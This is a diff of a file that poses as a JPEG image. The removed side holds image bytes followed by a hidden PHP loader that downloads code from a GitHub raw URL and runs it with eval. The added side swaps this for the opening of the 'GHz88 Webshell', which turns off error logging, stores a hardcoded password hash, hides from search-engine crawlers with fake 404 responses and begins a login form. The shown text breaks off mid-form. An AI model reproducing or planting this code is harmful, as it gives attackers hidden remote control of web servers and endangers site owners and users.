@@ -1,125 +1,613 @@
-ÿØÿà JFIF  H H  ÿâ(ICC_PROFILE       0  mntrRGB XYZ             acsp                             öÖ     Ó-                                                   	desc   ð   trXYZ  d   gXYZ  x   bXYZ  Œ   rTRC      (gTRC      (bTRC      (wtpt  È   cprt  Ü   <mluc          enUS   X    s R G B                                                                                XYZ       o¢  8õ  XYZ       b™  ·…  ÚXYZ       $   „  ¶Ïpara        ff  ò§  
-Y  Ð  
-[        XYZ       öÖ     Ó-mluc          enUS        G o o g l e   I n c .   2 0 1 6ÿÛ C ÿÛ CÿÀ  P P ÿÄ              	 
- ÿÄ *       	 !"
-$#1qÿÄ              	ÿÄ ;    !  1A"Q2aq%#$‘±	34B¡5CRrðÿÚ   ? ¿ÇÒéuŸK¥‘÷ñçôë–ÙÂŠúÃ;d… C!G³j`ë×„4:çyH,Â·ˆqà‹M6ÞIf“M4×ÎÛcX$(%ˆP9$ð ûŸ·[R¥Ré–•u+;645Ø"†-çÀ ¡ußþ_¼ÀÂÐó-Øã0}ÊTÚGuz=RÂ,3äYŒ¥X:ºîÝHaHÓxÌ×Ž*è¦ûSç`¶Èók¨åÖ µQVƒ­öÜ*¿éùÉõ*>Ø¨ØãÎ V¼7eud¥akt¾!Q,*R³³í·GÓPQò’NÄŒzÅ¬b	56£•6Ÿù6pzð§"c8Ì3'¼³'Mqþ6ˆ˜­üG“i‚tÆqŒìl@“9ÎÂ0.ÛšAêÝÁŒµcø‹ˆN|li:¸9Æè ƒpÓ «º/à×^ÎZn³…×LÜø˜x84Æv´–º´•;[#$ƒn½ª¿òhà' öôäÂcõÎò3‹»­2o×8Æ5K‰õAv*_×?nìX«?Ó”p°ãy£Ö†¿‡¹¨ Í„#¥zôÈý‡§2®3îF0OŒž½e>{‡ Guä.¹V €(CÁÎÒ' h/ªo%>¬x1Xör:(>}ù{ò yc¸X„8b»]ŸUï:üdO£Ms´ó×VA¹Ž¥‘¼p„'ZŸ3'3EŒ-×yâÓbj:‚>º­jOv¦UwÓ#ê2cl~Ò@gFþC¨©ŽÌjÈ›ÁÚbzÿ 
-^:”µ¼ò»-tÌÔdf ¸j{XTh›¨õ8aU‘é»…M•¼^+dÌAl¨ø"(KKà
-m1$$
-XÒKðK¦q¼rÅ¾Úo®q¶»gú VFF#pG~£ª®¥:”]©Ö¦ôª!!Ò¢²:pC+ ÊAà‚ ®‡ÖzÓ¬ú].³étº`=è'œh…_/…}Úí’¯×Ã Ú@L¶\»,ŠxãŒ¼š½zÔ°+ÕJð-¬övê+ŠY³½õõ½…¸¯[†'8É'Èä
-¹%˜°  Xq=¥ô´ž¬“[4èSj~µ4ÔÝ¢á#°d¤Ê‚Ä“ôR£L5kŠ¤XØŠ—•Œ>åùlôŸµ:t\‹ÎbaƒB¯A\Q3ä8œ(¦<ùAÐ;îdë)£n×Ó“LrñÅ’ÙÎ*Ü|J¦:
-Æ‘œÖ×2rF
-Œ¤¢¶ÐéŸG¤AÁ8Èõ&\½Aø-ÁJ) çê/jþ`t.ÄîEáÐ
-ÉúAé:çT â©mï¦"%Cb"!Äô7¨²wÎ¦• 
-ÝÃ†ôª%Ù;¾Ðâ[Á]£UëzmFú³²šö¥kxê°+ÆÝ7®^Ò®éRã½"7›Šµ¢†N+-ºb7¨cä,.55ãHÇT¨†­E`)ª—PêT ci 20y=MÚ­yÙ½S¡õOdc¨iUJnq&~zn$ÊRp»Ë)fG'Ô2 ã—'™¦àÐ.×mEÏ™×âÏZ¯ù²æ¿oVõÝÍð¶›’uÏSÕ]Ÿ|¬A°@.À†Ò)<Ê ô+±'>âÿ Ó©ƒ¤”ë:&ß$ú	'êƒÚLÁ#´Î Äd{qôŽH¨>*5;»‹jDo©²ÃèÂ
-Ë·«ÃèÆÛYþœm¨¬êÔˆ*[9*Á5ø¥ét»UfÈù%3ªÈ=
-ÂGU¡¨êÔÚëW\Å'›âéõ¾AR»_¢W×ú4«_ ÔP
-éÕººš
-»ž-¶Ùê|ëž4R¿êF…ÝJZ›v0Ôd[Ë zJ|£…PU‚8Àç¡;é¯Œ½	'ëV¶ŽcLÆ,ÒÁÀÎºÏ>Æ¦×*e™¥b)f,ß0û"j1ÁÐìÿ Ê1®áãÞþÕvÕ˜;bäJØÝ++ïCðOz7“%é>¥N³UîÎ,=zï\¶cEVäKÑ>Icå•7}.“ÑjHn;^è§±GHI° ¦ðôÛ åHÈVÝÊäçÇ‚O:éßŠ{mSV?K|@öò
-þÑÊAÔÔiAíëÁÍT`2ôðj ‹Ü	1í~¥K8Â’$ÿ †~]=9áž¦Gõ*–ôýÒ9E±MÖ¼m5XÌfÞ9±Q¤Ä¸}i
-D%«ë´+t+;Fë¦Ó:v“:­-”&¬¹Ž‘hé_érDà|Î!ë ãÓ˜°;Zžl³’ë¸‚'ûðó¦õž:çCÈ&¿Ò€aeà˜Kkm6Œ»•ä
-‚uT".}J&\ÿ hciŠB2Bà+ÚT½7ït?EPÃ¾ÐŒÎâm´A»F\Âlæ°çøc2–ÐŠABm¶E,cÕ¶\Qˆ¬‰JÁ]dÙ5¹¬¯­ïíÍÅù€í`OÔ–
-Y@È8È?lx#¯›£KÉiI&°¿Ri1f¶¹R2f1NÁ%_“g»*T€èÀÓ¨¡Á??N:ƒýºˆ}+×œêŸÉ€ïhÙ­¶qú÷LÙ,ÊˆÞBùr½¬†ó›c‹Éu´òž„BmzÚÛÌ¢TV^¸	ë™8' Ÿ°Ïúu²©fUX€3ã“¸ã>NGî:£ÏË/¯;¯Hšpé¥•­B¿1µK‰œ
-¤œß/%iÉ«
-VÂQ%¦:í_	-¶1oöÏúõLî?RÅÅoa\i^èÉÈÛF|èýÃÕW*Na)€¨P¬Ê
-ÎX•#yã¯¨¿z+CËêÛØ­\ðÐ²æjŽ›iŠrm¯§²â*d³ìW…Ò¡QbâBÈ¨“¾i'%×NEbó?“üÇ'[¨ôú§hë=`Oi¡°UÏ¶£u¾
-Ûùén¤ºRè}GWÇ4fÔVJmé³‹Íê¼ëºÒi„RªèÕ~ˆÒJ|l%m'ÛÍ%ë"ôLW•‘ V®Ü2‚è7œœŽNsÎX÷b¿?_–=¶’Ñõ{s ¤}ij4¼Ã=SNš™ˆœjx¥FV«"ÔŽI(âEñþ›)]ëÓƒÐ–§†Ûm–[4
-m¶ë`5“-7W¾Œâðãfóª¥ŽÕb‘ZýKŒa#Vb%à„K™ËY‘õ«å5ÔéüTä‹$y`ô4ý6ÚÌ¼Üp ÊC‚7¹HM¯¸÷†„í'l{OiÛ
-+©á ýPw~j,S5T4(F¼Ô¨;ÒAéú`*HJ´‚TPÐg‹tïÊ(6/Õcg’ïˆ5–U¸1@Qb8™Y!ö¸ÑàrÍ<ÓÇÙrèˆ6hÇÛ)¯Ï[{húhÃ8
-½Éð3Ÿ—÷ÿ ÚÆ0<õy+Vâ>BzOQÏKF+6êvâœ%=À’~XDõ…PpWÂà–c–<c8ÒKÛê
-,~Mú	´ÔÏã¿k¤Å†²O»I¢ÈûÊs5àJ»pÌ‰ÂâôŒÈò>_-:ßˆùÔÉü#cãå£ôÈþC·W1â:Â^ÓQÏÅ	06Ó¬Âq@
-Dj˜$
-äUWÁÎå$œ?9úã¿ùFÕ\cS³»ÍM5Í=Á2>Çh×‘\,(É)÷JBçkÂÙê;
-åJ»ýñ#jå¾»W³(p=•o°’QÈD×
-#Ué¦Mh¤ùUÃ*Fü¨c?NÕÝÕ=ÝnÇé¾áF5¦ºÓ12’§w¸0…5ZŸ—ë€©4Ú£‘ûéœ…ŽuC1ìý“‚÷ÞyÑíýîý%näÚÎJ¯8ÔÕçµô*c†Õr²ö—èÁ§R€ãý
-«‰9W=¥HÀîºæÃ×9÷,çAã­×»,Ìì”.«Ž©ZFùbêá–	QEGVNs, çqÈ'ƒ‘ƒÁ¬;O¡ûŸØMm§btN“›ÕVqêOw*Ö™kPÑ¬ØˆÑôåX³JÃÒšI°ŒÓ¯™ìE£¤ðøŸõWoä°kÍ+ö âR­{­«%´íƒÌ j;®”Û	ŒŽçYÚØx£”°šÁ
-öÆ7&&ëú‡,ž»íLÔœ…µíYêbw"älIÄÎÜ(*¤âù`Û¹FÆ	úˆ·üA»S¡´„Ü-
-#$ºþ˜žŒÓË4¦€žÍ13)QÔüºpÚ¤3Rx§O®JÁ$c™P]vÎië¾uqå{ËÆkªœy÷N.‡Ç-ÈßBúšÍ,@óª³ªÚ¸°Aoçêr%µèX0¿U£·NäÙbƒ¸9 ŒŒŒàùçïúõò•‘Š¶7)*ØÎ23Î3ãôè|»Rn¾bêöß@ò§…qŠ·|Eú»Uº¹µyû¯Ì$!7®ú¯’&®¢["X­O¡yê› ¦~Æ“tADhPýéå]¼ÐmÞGïíŒŒŸ9Æp=óÔœZ]Ó­êáˆŽúOÒeyq‘Ã!Àbò»I GU„èýÉ :Ý5~ÑF„”o–L …SïT[ÐµÓ$]$gÏì*äw]½ó¦!À¸;¯m@ßÞ ®&IUËÚ¬{¥Ò„Õ¢-.SmÖÒ’ƒ`öÆ  ÛíÑ®»Õ·vU"oÌL¦š;¡'‚‘5s’"åWó)Àâ@ ŒÃÃ¤äÆä«Lá1i“ƒ}Œ^Y5±$+þPãÑýv0oÍ ü¡©˜HU
- @È“ª¢sµQêMÔ)Ê¢?ÕM\à†4ÎQ°Ù Ø$2§¾;gÿ WJÞ/NwFÄJG†DÔ:–yú ÈÏŒ¶ó˜ÈMfÚûW!äöQUZ%a‰zÒ³––£îDK¥_¬ŒX¯h™¤MŒ^r£Ô^!dËÕ'<#ï´›çOÞýþ{Š¼‡/Fè?©+–$ ýYÉ'
-wg'$“Ÿlý’í¶€îjGÍAHÀ7lå4ú¬®ÀÌÌšxôÑ¶¤cú€}ù‚®IË*e­s ögÂ~ÔÖ;Í¤‘åt@ÁÓˆ<f0&%Â.Žy ²q¤B(ñÁ¦»˜Dšþ’Kô=e3%}v(­x  H©!W|p9òM­¨ûw¡4––“¯'§´ä }Vi–&$½BvR-–ÜO ±áAÝŽ›õÎ-h;aµµRlƒA€Û@ìÓ¶ÔIãø hÐÆFãK<XŠ‡íß: ÀlchEŸ´eëX\µ½Ñ©~FU„fò¤–Ê’N=ˆÚO¸ê„“ííG
-g3 õFFp&`ñ1®‡¸ ”®ÓžA0[Ð…¥ÞiFV®°ÔY3d\Î”Œ*ßä*`{7
-'t•‰×$Å+Ù£tqE¶ñ‘¦¹Qå-ãÃ
-10êrÔØçiPÜ0<Ž#Ÿý OëDÐ—óúïÐ¿ºH˜IäuQWqúv¢6>®B¢àäàò2ÝiB' 9Cºaø8˜âÞf…TR:Ñÿ Óö†Ë%Žï»¦N¬OÉÕÀ@ƒ
-m£–¿ó3ÉsÂvªƒ ¿Ôwÿ .@ªï¦„ü§¨ ¶…,FYrT0mªŠUWæ_v>>d«[ÉéžÎAÝ6¿³ÚŠx“:YÈúÉôÒTð®L‹˜°ƒHv˜ÜÓº!¿næ¹S£D}Á>[mâ‰EÊT0•¬ _ì,'C]çüÙp³°“çj¨”ïëíœV °Úá…·÷ëPDZ[-€µV0`îÝäž>¢}ùçÜŸpmÖ»Õ2O6ò²O*ú•™Ý¹žX‚HSƒN(J„Ú  /ù+1ÕŸ¾#(÷Põ*g¡ºÓÂûEO€#Ñw&jÎ6õ?;ñòÚ¡È)+žUäÎà]lºµ\ç/{èŽ„¦²*ÒI¨¡è/‚“¢ÔÐ9Í<'$ç'#'ý†yçt/&—-\\WP‚L`/p9ÆqÏa'þeÆê–Â¨œï‹E]žÿ fçç¨AªAàE‰YönGtm,ÅÏ®wXTÕ>AaN#•’õFÍòjÇÅµjÉQáFd–¨ÚÜåÄq^<µH?¨äyêòìîƒ°J­Üƒ2š*¶¸†3µ T4ÂÐ§ ªìÉH”¸‹**W;¼(ê­½ËÂ¾‚P¬f=„´©¸e·ñÁyAå÷§4ÅFJöÅ6{eò]J¢é¿q§íOCç›f#3€«SÖJÝfiÉMM\iÈT«$ûrGŸ8$ãß9>2û¼:²—M)ÚÎïQù#NÏÂKÃÎe‰Æ&"·E¶8Æá¸ËÝ.Çz· <™ÔmHkŒ?˜#ßÒtÕÔË’„ðA­¡];
-G0HÏ:›<C)Jµ?W¬ÁE#‘¸CÊc×9ŸÔ`äžGØ¶rGÜ“úõ¸‹²DB R]©:Þ+¤:45Òxm¨uŸrÊVqº[~\ˆç0íM-‹TÎdÆoÒ¶uÌÌ›Ò°š³!`U†~´á d0ÃûùÁ=]]§øƒî§g.”h½BÍƒ+§œ´ÌÎÝ»”®rs´©äŒñžŠÏ‘»W“k‚ú3Qƒ¬ÜJ­hJÄbvbëô§®
-xu›,ž„ûc·Ž´Õí¢<„LÌì]ÕFI÷³‹°†¡¦•D¤¤ÀÌÚ¨äcn
-ƒÏØùÀÈGVö¥øØï6¶¾³¾œÖ2œlÜ4ä&ž…ËACÍCÓƒ/ê ‚ '2,ÀQ‘ÖÇ¯;—–ÔùáõÉéý]ê*·õ«EÅ×:Ê~K­-ØšègFh5‘]$hÛð;­8£¬­k99­·°¸®×šTí\,ìlkj+"%b Öú*¨ú_ ä²’p[òœ‘‚ÄtGÛÿ Nöög«ÿ µ)©ç&5¾¹€ÖñB
-&%Ø“N2Ò_)‘P2Åâ×ä£X}ÞìRY{n“*h¶™D‚‡[o XäK¿Ù¬ÃîD&¬B2e•Ø[:˜eßÂåŠU+ê*>œf!šiÝ!	¦­Åj˜{’ÏÆ1—mÌ}¸ûo‹ï7Äu;ó$ÒòåÅ99Ó°…‚çœ\nÇc<uËçüƒ«wƒÅÙ}FÔúºDàùún˜Æ›ORØyô­¶µ¥[GééãS  xEFçlùQCþ‰c4x
-O#‘“Ÿ°ýz¢=€
- Ýá}€#äqïÑiâÞ1ëò‹9Õþh²9TL´W—>ÁÎz:zA…Lq€Þ¶w¥y…€Kú§ÞT<¯“óë™4ÒX,ˆ'!Y;ŽÉÞÍ°6ñqÿ G»M~_Ü~Ü‚}ú¸t>™í¢(“ÖzÆlà}:r
-ËL’9
-fe}.-‘ƒR*<`c6¸øošÜ›=‹pr¢ÀÒ½GB)nQ%–¼¹¦Àö¾öÑ)s*&iÎŠê%Â—Zb{“šØm[ÁÖ NÝNkb·„£wBæþÖw
-Q*¸àd¼­F	œžHP ÷ ž iÜ›¨;
-aV68j}\eØIÕÚGI'Í”Bˆ’‘•;yA
-Ò:^üšÆbn½Â-ƒm#Ñ@ëãÆùÇÜS6ËŽr°€ƒÿ ;•ü~âcm´Æ»gUêŸ:çX6ÛG®Ì%ì<šr§' dzX^}‡-î ÆH¡XÛD¹íö¨«ù-C¥W`#„«ªÚ©pNH5©E‚yÁ÷=Þ1íîÝGù#Ïê½¼›·Cê5YxÓäµz¥Y_"&–Aü*ëC¼à+q7Km‚1Pm• @inä88™å¬ NŒä
-^c.d	Üp… Ž –>[àgÜc®‘–í¶Œ¿ø{]c§4ì)¿Š‚ˆfÔpsgY¼âË…œ†›Ò>§¶*"1—Óå}2<1ù¾7À—«¾5)]Ñ÷ áåÐÇý£V5)kdôkMÖÇ~`æÎ‚Ÿ´»Ÿ¤:{Žß×4ç¦ÌnG¡ªPTT™»³ó¢Äb¶ ’ÿ çõ  þÇß÷ëŽ±÷Ï¶wFFá“‚G8É÷Á>z¯Fø•õÅ_¡H…´9_r³ªD‰­l:À‰ˆîÑÒ¶H5„§Z!Bj.y²î—k}Ée°rb:SOT«¹]!ÇŽ?n:HçÎµä‹ZÞsÝéyþzåtnÍÖ[‰7N“¹Z#UQO$ê›.„JÙ#]Cr#¸Y€ÁXÙ›  Î9ö Ûôcì<çù'$þäóûõë Ÿz÷¯î
-9Ï¦·è³òšé¥.©$¯Ô$P¡€ nDS¶n²‹2¤Ëu5Á®¥X Š”¬g\õŸÿ ç?ïÏïÒã•|Aû÷Ñá¬°â¶µÐÓí
-Ð>>ÆbE)ÄCbæäØ¯-ruMcÄÀ×ºÖÊ*,\)`^««ÚmÍ
-ge­\k°.– Û«8ùáÚ¯ÁìžoKÖ1¦ýgWMîpó‹UÞ»zI=EEÆrz:õ#³ðî¹6¹-›-/¦WmÒ\z8¡×žÕ0x
-…t¿‚Aäçì_cÒ?Ô¾µî—¿—Žcã^MÚ˜ÉÄô·òú‡IçMyO>´l0ÕÄ‹­}t7[è†\œÊ²9ÌœÚóm_a[¯å§¯®rÖ°ÖjÖ÷PÉ\kÛxû÷1 '®Cdm vF70eÉÊà+€æÁîm-Ú]að?ÝK¤ÕuSMUm	8f¦	›¦Yb!’)½2Z.UËÓˆD¥ ÇñÊ\~:ëÁÜ½8zâ•RÉÌªK˜cûbÕsÐˆ£œ&ß¦ºéû“®çˆìû1¶$À,ÿ wþ\gcŠúÅòò3F$¨øiU#<û`óî:åI†4{w¥­«.¦¥Ö2õÇa´ÒQ¨$‚EXé<ýÆp}úx>NùŒ×o?Gm	†©NæN
-rE“ö$#J•nÒ‰!ýòAÇýH'<§wêû‚i¤¿ÈiÍ—k´;ççS;(PY‘éÄäy,¯±|õ v»òG!Hõí¾$¤¥4«Æ´…©@œ³VÃÖ!Ò›
-7”‘‹´… Â$£î…Ñê{ò¬ŠÇO°y³ä•WSY½–:ýëIëdoIô5b“_¹ˆÝsª›GüÚq´ $ŒqIOgæ-Œ‚BÆH]_ë«V²‘Óú¦ÖÀÆG£ŒƒÈ!‚’w0çp$ŒÀ»ánËUèÞèö#ROMBØÉ$Zn:¸BDˆU•þ®KEÊ4¤¬Œ¯¦ec„q¿Åü„}ˆ½É3åþ§–õÉé^Ææ¦n¥åBZ—jçbþûW‹ `l³’‹	¯ZòdÖ"”‰"“b ]nm!ij.ž—{&*õ¥£Ëà€FÓ÷áO?¨ãŒcŒuÅ]ÀÑõô°”Óu¤VQbj:©JÍBþ.XgŸJÆFsq¸dç¥šNý
-ÆxšÊ£R«ç;!Ú$ÕË ‹	˜:°ð›¥FÙcU›Á$R1-ïK®'É‹· IÅÕîx8çÏoß ÒF~Ùð	çöýz
-"ü«_^vŠ2·­-ô“«šf’ßK ‹ª ¯ÈökW8
-cõ.çMs-ƒ¥¼Ú6Ò=eV’=¢’ñev“\Š¾”¹·¹°¶ùõLò=‡ gn22p<ƒ×µ?r îFÛÓ>zêüePËñ z·ÍRog½8u¦(étJ¨PßÜZ½¯¥.píÃÀ’Í¢AÒë¸Õ¼65ÕX´ûsyvm‚ÿ 6R—W7WöÆ;—î|0ûŽ >OéíÒ¯Gãý@çÛýùñþÙ³<Ý>omëíÔ¼()Ï÷µkZJlK,‘Ã ÅÜF
-4•œ)snž¯—Ãì‡‰O©Qà{uãŒ Ž=ÿ AíÔo³û¿,Õ®ž´íä?eKB—zG	¯6e6¦ôö§ÀÛ
-±Žƒœ¥ÿ f|¡C³U³ÿ ±_ç4šC[jÍ•MÍ8,%em¡íMÕÑÇ8þ\ž  ûóŒcŸvÿ COwTGi¸
-_9Øý4ÐàÄBDf%¦±Ž'nsà–8MñP¾¡c¾úÏäúÕÝï¢ó&ç-äy"8RÖû_jïÇØÿ ˜3aÔÖ+z+¦×NÏ Â9«µ”QôlDQ40ÒE ÑVëÈêÛ‹ârHÞ2ñIõ_ÌÇúY†O',:ë¿‰WNÃHvïµ0ð‘·B}n™…Š§¬a*E
-zUb½N#éÕ0õe"Úf.Q„Œÿ ª±H´Æ5"™çˆ-ÌHéŸVn=š+	#ÿ ›Eiy-
-›v8=ó™‚gÒÕ`ê†ßo¿[
-é¼›ç2Í.ÛD‘^‰Èþ¤Qˆú’™eB™ Ø…q‘ÁÏ¿žRîC~
-B+JÐÛõ8 úÕÃ4ÌÚÔ*ÌÓ–”¿ “ºÎ1ÀÀRáBË–I\ 
-€1[0
-‹I‡9yãî)‚øÛY "	7Š]6Æq¾›g\ÿ ©vPà© ûçŽsŸ= Ñ¬Ö•)×¤Å•E¨Œ<«¡¤c`¨ñÏ·U9öWŸÎ,: ê?½y²ýºÇ1hÖsâU(ŠT
-g¡á˜eÄ/ë£®©óîÂJ¦A›]|Ž‡ÛèÞ·Úí4aËZVôƒAIýeIhBI!Ál†$ñý3![qÎHnw\7Rá{©£oŒMÓ/ÉÖ´èý>5&Œü
-gw¤j…F«E‚ § dc@K:V&ôWô/kú+Í=áYék[ó@fU¹ç5©zzmF„†È–H,[¨›ÿ nÚ-dcõ Íwd[†¯z"³ ¤g¥4ÌçÏ˜RÑrª0`Bà€8_;‰À #Û$^Z´š½ýµôÍo5K¹ZYKjGY%¦µÌÌÈs ò…"!a„[9I2TFæþþöÄ-•ìÓã—‚w# aÍ]¯£ØË’óÉÛêIÉtÙ®¥ei_ª½FæºpVÐ§à«±Wž3eêµCi±7è‹¢¦"å¿éÝ}ÈËHÉ°AäpG>ã®h×µÖ¾»¶³ÔÑ5iµîTÙ§-'–`d´X1’«øAF$¥$<†þòy¶Œ9~Ž¼,©ÚnµÏêe›boW¸>Þ™_…ŽZ]Ú·¦TÝúñCËù
-ùÌèUy›
-ü•J¤¹‚GåðO·ì}º÷Üò ÷û>ßí×A"³–èà5ã÷a>	Z¨UÓËRº-ªÝZ÷\9°
-jrW¤¼Ý–Q»RÝ³²*êÄ¼úÕ]é$Úµ®Xq€=€/ãÛwÛÿ ·þz\ý²IÀÎI É#œ{Ó­þÍlä^;ßF_RìµŽ‰[Ö¸[gKèKÍ°¤oùQ­	)Wë…•­Ñ–˜‡s‹*kuzñÅ¨Qde`°WU_˜ÅKLEÃÛ~"í¼g r<€2GŒyÉÉÞ‡í¦µîL(Í-V«Yƒêÿ -Z(ùI™Uô¸àŒ²0° Ô|ê\þÃò;Ð8Ÿ¡C¹óž½æ
-‡©mÁíàØhlù­:Ì„Dý£k¬YHO kŒç|:ð¢*D‚Y‹
-ts‹Ø³«|˜‘zrO; ñƒŒsT3Çóž¯í1®éü=Ùjíw¦¦ôyôÔÐ¨šò^nZ´ÄH”Šôm¬¥_GÌ®Ÿ¦0Wì××æöÄþÕñó¿“¹—Sè´;ùÒáòï_$ÏmÙ›Iµ·DûVÊî=f¢-Hº}—òâU¯ã±õ¿]H†±Aó®ç*¶vÔ¶éè¥ÙÃ3\€Wh*I#$™@6•ü«Õxú†^òêO½ZìüÝC&JèºUÿ 16ÿ X“D*ÆÃif&µ BÑæDGFY£YP¿[KL­X
-uàªX á.Z«Àhµ„q
-GhbÓÒ8 ‡M#Mqt×\cý>‰À
-ª aT £Ø 00=¸ãŽ¨Ê•µG«Q‹ÔªíR£“’îç,Äœ’I9óÖ÷ÖzÓ¦½ðJO¡©3Rn°Ë`–Cë–5ñ‹ùú«ÜŠ@Q·O1N.Ø”"I\ÕYÃ––ÄÆH®d‰‘¡LÞúÊÞúßäÖú\}IP~jmÁ$ yÏýÀþ™;²ö—Ôò:ZGñ–ãZVÙJv
-£‘=&*UF#`”`R`*S+p¡…\=)âžÏÒ­Ò9õk¡ñ±ÄõïÌ®RÂš¾xô˜0' ³ºÍ**Ô‘LºkÉºkÔÍ+zJbÞ#Ò:|MªÜZ
-óÑ?Éj$Ý¼ &°XŒ)$ˆ³Ž6œFÝÄàY6Ñ•/®Ž¤í¼í;Åÿ ¶ŒJ¿*n—“éÀlþÕCà*Å³_…
-ê±Ô•{ë_Ô6ö:\47Ú·§sí‡ô4RÌê¥èmÄŠ¬=ÏøÀÒzúøÀ¥*º¡Êªƒ€ XTäŒî[ƒ‚¢Š¡¡ãè]Ø5¥Bl#aÉ-Ë™bvï8Ü@ÜHàãß|Rë«øwe9A%5&¦M§éúå%Z02T¡¥–N)&&GfM
-å„€oúæÂŒÞÁòMÍ;=’µÌ./Ÿ/k~	E"a9/3¿ñÐy¤˜–,>²Ùl¿ÉjžÂ>¸³Œ„ÖZ‘£XŠÖy’&Îµ†­YûP¨À&h àg¹eàc<û``½‡¶ø] !}i'c
-KQ¦ulFµIÊ“_\T58¨¹(Ñ+cJƒ€q~
-ýÈé[d»ü×ú”gmçm/`²è°XÚ™Ìht®kÆqË«Ú×•$²Øî³"³c[P«VY¿[uÉœ&#°ëªµçà"–ëûÈ¾£qC¼Ìª"¶Ãœ¨‰È”!ö¸î <¥µ¦à§MÊj8ù€u-¤d®xÉã«*gÐòÏ«–t¼T”Ld´K´laWÚ­´Ÿ\ž“‰~ï|ÖÎÛä7Ñu`¶•h(œ¸¶Ýw¶õÖ‹„càL=†¦áëÇË¼å=—Fé…žvcGøØsù}·°Ð·UÅàÔÒBSúÐœ;ÙFI;ˆãÁQ•$8ê+V|[CÚS†´ì®™›Òò1ú%ôYPž—Q%ãL£˜˜àÍVVK+&µ,¤cŠIbøÇ]ßÅôVy—ié¸
-æ~hâÏ?y¨·F4º"5ÕËA¬s-¶·“Fš
-Ý†x5ä¼Ýí›5P&EÚ:W<N–ãç[Á]*áê-=‹%Î&2p0}Çª0' i õ:àƒÎ5¨W³»Òs’º‚®Ê”´dÄÇÎœ®xaêŠá›KC• üJãÔˆ ÇÇ8oP³?\+…Q¼ûGG\Á´˜a`~Ãö%{l{,ÆcÇ…Å ðÈT±Á¡† ã*Jª “'	z…À 9
-••½…¡@“QŽæcÌÙ 1 ’ 'öÂïÕc©µ4Ž¨‘7·¸J)þ­¥2L\$Vw$TZ¿"Å	8É,ÌZ£’äúóéÇPŸ·Yôº]gÒéuÏj¥cÕÅ¨r¸ÊØA §-f$  `Ói%¡	ÒH‚]3dŠ]7Ó}sv×8ÏÖ¬ªÀ« ÁAçøã¯JUjÑu«F£Ò¨„zlÈêG †RþC·§|cùæñ(ETãoÌLK‚3]•ËE^¥!9ûç’‰Sè),ëù$Iþó1äróæÒI·ü–²o¶ûEz=
+<?php
+session_start();
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
 
-
-…OMÉð@u9>@f;}²‚GíyýäÉ^†]U­°…
-ITki‘À ´Ì1Š”®È Ødï« ÁÈÁ*cƒ‹N…¶úh›¶'šcôØ—YïnþsúLÀ»÷ :bÝÆ?ÓíH :k®¸€M~ß@’ÀÒ8#ÄIàqÉ”ä~ãý:fÒ]½¸P*i]HŒØ'f±¶jhxÜTÒ—Õ1ýOí“Æ:÷¬ü^tÅ$í1]ú“íÆÇUXz&¾à÷û¶™tôODóTû‘¾¸û>×(^ s·î &3¾»#N_/èxÚñ-Èä¬¦?’¾ÿ ~—©vöÙU-´¾¤¨W$4¶±¶ù'òÓŽÒvû¿©ØçÏRGœ|jyþ¤SW?Îu¦®ò4Ö(í1 G[´ÌÙ2®Õ2jÊŽ˜hrçmÆoÕµ¿Ø´—í—gRÍ®%ÏŸ£Ñ¬¤È9 o–„äR	n-€œôì÷&FÈ-¾–ŠƒÑ@Š‘ÚâhgY©–”–¤_qN…õ;"2 …!K®J « Å¡AÁ¯^, ðë"€aGÒ8`†=14Š=5ÓMqŒk®>¥•U@UT   Ð:©R¥gjµêÔrK½F.ìO$³I9'ôëë=iÖ}.—_ÿÙ<?php
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo ($url) {
-    if (function_exists('curl_exec')){ 
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($conn, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-        curl_setopt($conn, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-        $url_get_contents_data = (curl_exec($conn));
-        curl_close($conn);
-    }elseif(function_exists('file_get_contents')){
-        $url_get_contents_data = file_get_contents($url);
-    }elseif(function_exists('fopen') && function_exists('stream_get_contents')){
-        $handle = fopen ($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-    }else{
-        $url_get_contents_data = false;
+$auth_pass = "7da9d87632f1a81d227d5e14857cbc6e"; // admin
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
     }
-return $url_get_contents_data;
 }
-$a = geturlsinfo('https://github.com/mr-combet/private/raw/main/test.php');
-eval    ('?>'.$a);
 
+function login_shell() {
+?>
+<!DOCTYPE html>
+<html>
+	<title>GHz88 Webshell</title>
+	<head>
+		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
+		<meta name="author" content="GHz88"/>
+		<meta name="copyright" content="#GHz88 Punya Kuasa"/>
+		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
+	</head>
+	<body class="bg-dark text-light">
+		<center>
+			<br/><h3>Akses #GHz88 Only</h3><hr/><br/>
+			<div class="container">
+				<div class="col-lg-6">
+					<div class="form-group">
+					<h5>Silahkan Masuk Cibay</h5>
+					<br/>
+						<form method="post">
